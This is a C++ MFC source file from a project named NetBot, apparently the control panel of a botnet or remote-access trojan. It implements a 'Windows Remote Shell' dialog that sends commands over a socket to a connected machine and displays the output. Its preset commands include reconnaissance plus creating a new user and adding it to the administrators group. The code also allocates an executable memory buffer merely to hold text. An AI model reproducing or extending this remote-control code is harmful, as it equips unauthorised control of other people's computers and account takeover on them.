// ShellDlg.cpp : implementation file
//

#include "stdafx.h"
#include "NetBot.h"
#include "ShellDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CShellDlg dialog

#define WM_SAVE_DLG    WM_USER+0x2008

CShellDlg::CShellDlg(CWnd* pParent /*=NULL*/)
    : CDialog(CShellDlg::IDD, pParent)
{
    m_Buffer.SafeCheck(512 * 1024);
    m_strCmdLine = _T("");
    m_ConnSocket = INVALID_SOCKET;
}


void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
    DDX_Control(pDX, IDC_CMDEDIT, m_CmdEdit);
    DDX_CBString(pDX, IDC_COMBO_CMDLINE, m_strCmdLine);
}

BEGIN_MESSAGE_MAP(CShellDlg, CDialog)
    ON_BN_CLICKED(IDC_BTN_SHELLRUN, OnBtnShellrun)
    ON_COMMAND(ID_S_SAVE, OnShellSave)
    ON_COMMAND(ID_S_CLEAR, OnShellClear)
    ON_COMMAND(ID_S_EXIT, OnShellExit)
    ON_COMMAND(ID_S_HELP, OnShellHelp)
    ON_COMMAND(ID_S_ABOUT, OnShellAbout)
    ON_MESSAGE(WM_SAVE_DLG, OnSave)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CShellDlg message handlers
void CShellDlg::SetConnSocket(SOCKET socket)
{
    m_ConnSocket = socket;

    sockaddr_in addr;
    int cb = sizeof(addr);
    int ir = getpeername(m_ConnSocket, (sockaddr*)&addr, &cb);
    CString OnlineIP;
    OnlineIP.Format("%s:%d",
                    inet_ntoa(addr.sin_addr),
                    ntohs(addr.sin_port));//ntohs函数将u_long转int

    SetWindowText("[Windows Remote Shell] " + OnlineIP);

    //OnBtnShellrun();
}

void CShellDlg::StatusTextOut(int iPane, LPCTSTR ptzFormat, ...)
{
    TCHAR tzText[1024];

    va_list vlArgs;
    va_start(vlArgs, ptzFormat);
    wvsprintf(tzText, ptzFormat, vlArgs);
    va_end(vlArgs);

    m_wndStatusBar.SetText(tzText, iPane, 0);
}

BOOL CShellDlg::OnShowWindow(BOOL bShow, UINT nStatus)
{
    CDialog::OnShowWindow(bShow, nStatus);

    GetDlgItem(IDC_COMBO_CMDLINE)->SetFocus();

    UpdateData(FALSE);
    return TRUE;
}

BOOL CShellDlg::OnInitDialog()
{
    CDialog::OnInitDialog();

    // Set the small icon for this dialog
    SetIcon(AfxGetApp()->LoadIcon(IDI_OL_DOS), FALSE);
    CenterWindow();
    // TODO: Add extra initialization here
    //create statusbar=============================
    m_wndStatusBar.Create(WS_CHILD | WS_VISIBLE | CCS_BOTTOM, CRect(0, 0, 0, 0), this, 0x1300001);
    int strPartDim[2] = { 400, -1 };
    m_wndStatusBar.SetParts(2, strPartDim);

    m_CmdEdit.AddText("Microsoft Windows XP [版本 5.1.2600]\r\n"
                      "(C) 版权所有 1985-2001 Microsoft Corp.\r\n"
                      "\r\nCommand>");

    CComboBox* pComboBox = (CComboBox*)GetDlgItem(IDC_COMBO_CMDLINE);

    pComboBox->AddString("");
    pComboBox->AddString("net user");
    pComboBox->AddString("ipconfig");
    pComboBox->AddString("netstat -ano");
    pComboBox->AddString("tasklist");
    pComboBox->AddString("net localgroup administrators user /add");
    pComboBox->AddString("net user username pass /add");

    pComboBox->SetCurSel(1);
    pComboBox->GetLBText(1, m_strCmdLine);

    pComboBox->SetFocus();

    UpdateData(FALSE);
    return FALSE;
}

void CShellDlg::PostNcDestroy()
{
    // TODO: Add your specialized code here and/or call the base class
    CDialog::PostNcDestroy();
    // delete this;
}

void CShellDlg::OnOK()
{
    //重载，去除enter键关闭对话框
    //CDialog::OnOK();
}

void CShellDlg::OnCancel()
{
    StopWork();

    //非模式对话框，需要这样销毁对话框
    DestroyWindow();
    //CDialog::OnCancel();
}

BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{
    // TODO: Add your specialized code here and/or call the base class
    if (pMsg->message == WM_KEYDOWN) {
        int nVirtKey = (int)pMsg->wParam;
        if (nVirtKey == VK_RETURN) {
            //如果是回车在这里做你要做的事情,或者什么也不作
            OnBtnShellrun();
            return TRUE;
        }
        if (nVirtKey == VK_ESCAPE) {
            //如果是ESC在这里做你要做的事情,或者什么也不作
            return TRUE;
        }
    }

    return CDialog::PreTranslateMessage(pMsg);
}

void CShellDlg::StopWork()
{
    //关闭socket
    shutdown(m_ConnSocket, 0x02);
    closesocket(m_ConnSocket);

    //结束接收线程
    DWORD dwExitCode;
    if (m_hWorkThread != NULL) {
        WaitForSingleObject(m_hWorkThread, 100);
        if (GetExitCodeThread(m_hWorkThread, &dwExitCode)) {
            if (dwExitCode == STILL_ACTIVE) {
                TerminateThread(m_hWorkThread, dwExitCode);
            }
        }
        m_hWorkThread = NULL;
    }
}

void CShellDlg::OnBtnShellrun()
{
    UpdateData(TRUE);

    if (m_strCmdLine.GetLength() < 2) {
        StatusTextOut(0, "请先输入命令");
        return;
    } else if (m_strCmdLine.Left(2) == "cd" || m_strCmdLine.Left(2) == "CD") {
        StatusTextOut(0, "单管道Shell,不支持cd命令");
        return;
    } else if (m_strCmdLine == "exit" || m_strCmdLine == "EXIT") {
        OnClose();
    }

    //启动线程
    m_hWorkThread = CreateThread(NULL,
                                 0,
                                 (LPTHREAD_START_ROUTINE)DOSShellThread,
                                 this,
                                 0,
                                 NULL);
}

void CShellDlg::OnWorkBegin()
{
    GetDlgItem(IDC_BTN_SHELLRUN)->EnableWindow(FALSE);
}

void CShellDlg::OnWorkEnd()
{
    GetDlgItem(IDC_BTN_SHELLRUN)->EnableWindow(TRUE);

    CloseHandle(m_hWorkThread);
    m_hWorkThread = NULL;
}

DWORD CShellDlg::DOSShell()
{
    OnWorkBegin();

    m_MsgHead.dwCmd = CMD_SHELLRUN;
    m_MsgHead.dwSize = m_strCmdLine.GetLength();
    lstrcpy(m_Buffer, m_strCmdLine);

    m_CmdEdit.AddText(m_strCmdLine);
    m_CmdEdit.AddText("\r\n");//增加回车符到编辑框中

    CComboBox* pComboBox = (CComboBox*)GetDlgItem(IDC_COMBO_CMDLINE);

    if ((pComboBox->FindString(-1, m_Buffer) == CB_ERR)) {
        pComboBox->AddString(m_Buffer);
    }

    pComboBox->SetCurSel(0);
    pComboBox->GetLBText(0, m_strCmdLine);

    //数据传输同时接收数据
    if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket, m_Buffer, &m_MsgHead)) {
        //数据传输失败
        StatusTextOut(0, "通信失败");
        OnWorkEnd();
        return 0;
    }
    if (m_MsgHead.dwCmd != 0) {
        //数据传输失败
        StatusTextOut(0, "命令执行失败");
        m_CmdEdit.AddText("\r\n命令执行失败\r\n\r\nCommand>");
        OnWorkEnd();
        return 0;
    }

    //显示信息
    m_Buffer[m_MsgHead.dwSize] = 0;
    m_CmdEdit.AddText(m_Buffer);//增加到编辑框中

    m_CmdEdit.AddText("\r\nCommand>");

    GetDlgItem(IDC_COMBO_CMDLINE)->SetFocus();

    StatusTextOut(0, "");
    OnWorkEnd();
    return 0;
}

DWORD CShellDlg::DOSShellThread(void* pThis)
{
    return ((CShellDlg*)pThis)->DOSShell();
}

LRESULT CShellDlg::OnSave(WPARAM wParam, LPARAM lParam)
{
    return 0;
}

int __stdcall WriteTXT(CHAR LogFile[], CHAR Data[])
{
    __try {
        DWORD rt;
        HANDLE hFile = CreateFileA(LogFile, GENERIC_ALL, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

        SetFilePointer(hFile, 0, 0, FILE_END);
        WriteFile(hFile, Data, lstrlenA(Data), &rt, 0);

        CloseHandle(hFile);
        return 1;
    } __except (1) {
        Mprintf("can't Write\n");
        return 0;
    }
}

void CShellDlg::OnShellSave()
{
    //PostMessage(WM_SAVE_DLG, 0, 0);

    char dir[256], path[256] = "save_cmd.txt", *cmd;

    GetCurrentDirectory(256, dir);

    CFileDialog fdlg(FALSE, ".txt", path, OFN_OVERWRITEPROMPT | OFN_EXPLORER | OFN_NOCHANGEDIR, "Text Files (*.txt)|*.txt|All Files (*.*)|*.*||", this);

    fdlg.m_ofn.lpstrInitialDir = dir;

    if (IDOK == fdlg.DoModal()) {
        CString sz;
        sz = fdlg.GetPathName();	//获取文件全路经

        if (sz == "")	return;

        lstrcpy(path, sz);

        int len = m_CmdEdit.GetWindowTextLength() + 128;

        cmd = (char *)VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        m_CmdEdit.GetWindowText(cmd, len);

        WriteTXT(path, cmd);

        VirtualFree(cmd, len, MEM_RELEASE);
    }

    m_CmdEdit.SetSel(0, 0, 0);

}


void CShellDlg::OnShellClear()
{
    m_CmdEdit.ClearEdit();

    m_CmdEdit.AddText("Microsoft Windows XP [版本 5.1.2600]\r\n"
                      "(C) 版权所有 1985-2001 Microsoft Corp.\r\n"
                      "\r\nCommand>");
}

void CShellDlg::OnShellExit()
{
    CDialog::OnOK();
}

void CShellDlg::OnShellHelp()
{
    // TODO: Add your command handler code here
}

void CShellDlg::OnShellAbout()
{
    // TODO: Add your command handler code here
}
